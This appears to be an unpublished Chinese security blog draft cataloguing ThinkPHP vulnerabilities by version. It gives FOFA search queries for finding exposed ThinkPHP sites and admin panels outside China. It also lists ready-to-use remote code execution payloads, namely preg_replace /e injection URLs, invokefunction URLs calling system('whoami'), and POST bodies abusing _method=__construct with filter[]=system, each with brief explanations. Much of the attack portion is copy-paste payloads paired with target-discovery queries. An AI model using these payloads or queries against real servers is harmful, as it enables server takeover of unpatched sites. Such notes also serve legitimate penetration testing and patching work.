---
title: ThinkPHP各版本漏洞
date: 2025-04-14
updated: 2025-04-14
tags:
  - 服务组件框架漏洞
categories:
  - 安全相关
description: ThinkPHP各版本漏洞
published: false
---

| 版本             | 漏洞类型                  |
| -------------- | --------------------- |
| ThinkPHP3.2.3  | 缓存函数设计缺陷可导致Getshell   |
| ThinkPHP3.2.3  | 最新版 update 注入漏洞       |
| ThinkPHP3.2.X  | find_select_delete 注入 |
| ThinkPHP3.X    | order_by 注入漏洞 每       |
| ThinkPHP5.0.X  | sql注入漏洞               |
| ThinkPHP5.0.10 | 缓存函数设计缺陷可导致Getshell   |
| ThinkPHP5      | SQL 注入漏洞&&敏感信息泄露      |
| ThinkPHP5.X    | order_by 注入漏洞         |
| ThinkPHP5.X    | 远程代码执行                |

fofa

```
header="thinkphp" && country!="CN"
header="thinkphp" && country!="CN" && title="后台管理"
header="thinkphp" && country!="CN" && title="后台管理" && after="2021-01-01"
```

ThinkPHP 2.x/3.0 远程代码执行

`Dispatcher.class.php` 中 res 参数中使用了 `preg_replace` 的 `/e` 危险参数，使得 preg_replace（正则替换函数） 第二个参数就会被当做 php 代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意 URL 执行任意PHP 代码。

```url
http://ip:port/index.php?s=/index/index/name/${@phpinfo()}
http://ip:port/index.php?s=/index/index/name/$%7B@phpinfo()%7D)}
```


ThinkPHP 5.x 远程代码执行

ThinkPHP v5 框架对控制器名没有进行足够的安全检测，导致在没有开启强制路由的情况下，可构造特定的请求，可直接进行远程的代码执行，进而获得服务器权限。

路由解析与参数过滤缺陷

```
http://ip:port/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

http://ip:port/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

（通过 URL 参数，动态调用框架内部的核心方法 eg： `call_user_func_array`，并能控制方法参数）

```
POST：/index.php?s=captcha
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
_method=__construct&filter[]=system&method=get&get[]=id
```

`__construct` 进行参数过滤绕过，类的构造函数，通过重写 `_method` 参数，欺骗框架进行目标类的构造函数；`filter[]=system` 设置一个“过滤器”，告诉框架在处理后续参数时，使用 `system` 函数作为回调过滤器